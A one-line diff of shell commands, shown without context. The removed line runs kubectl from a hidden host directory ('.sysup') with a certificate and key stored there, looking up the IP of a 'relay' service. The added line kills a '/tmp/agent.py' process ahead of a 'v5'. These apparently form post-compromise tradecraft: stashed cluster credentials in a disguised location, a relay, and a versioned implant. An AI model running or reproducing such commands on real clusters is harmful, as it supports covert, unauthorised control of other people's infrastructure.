@@ -1,1 +1,1 @@
-S=/host/usr/local/lib/.sysup; IP=$($S/kubectl --client-certificate=$S/kc.pem --client-key=$S/kc.pem --certificate-authority=$S/kube-ca.crt --server=https://kubernetes.default.svc get svc ops-relay4 -n openobserve -o jsonpath="{.status.loadBalancer.ingress[0].ip}" 2>/dev/null | head -1); echo "IP4=[$IP]" # 21602656
+pkill -f "python3 /tmp/agent.py"; echo KILLED-for-v5 # 1799230443
